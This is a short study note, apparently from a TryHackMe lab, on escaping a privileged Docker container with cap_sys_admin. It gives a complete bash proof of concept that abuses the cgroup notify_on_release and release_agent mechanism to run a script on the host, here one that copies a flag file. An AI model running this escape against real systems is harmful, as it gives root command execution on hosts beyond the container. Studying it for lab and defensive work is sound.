If we have a privileged container, and we run `capsh --print` to see what capabilities we can have on the running container, we can get something like this: `Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid`, which means we can use the mount syscall (since we have cap_sys_admin) to mount the host's control groups into the container.

The steps are shown below, these steps are PoC steps taken from TryHackMe container vulnerabilities room:

```bash
# First we mount the cgroup of the host system:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# Then we tell the kernel to execute something once the "cgroup" finishes
echo 1 > /tmp/cgrp/x/notify_on_release
# Now we find container's files path on the host system
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Then we echo the host_path + /anything
echo "$host_path/exploit" > /tmp/cgrp/release_agent
# Now we create a file called "anything" which in this example is going to be "exploit"
# Make it a bash command, note that I added this file on /exploit but from host point of view it will be "$host_path/exploit"
echo '#!/bin/sh' > /exploit
# We added a command to the /exploit file that will cat a flag and echo it to the a file called flag.txt
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
# Make the exploit executable
chmod a+x /exploit
# This step should be done because the release_agent will execute the commands inside once it releases the cgroup, so we need to make a new process and since it is a quick process it will end soon and release_agent will be triggered to execute our code
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

The following figure illustrates how the notify_on_release is going to notify the release_agent of the root cgroup "The one we are mounting":

![](../../Attachments/Pasted%20image%2020240427011318.png)

Big Thanks for Edu for helping me to understand this.

Full PoC could be found at: `https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.`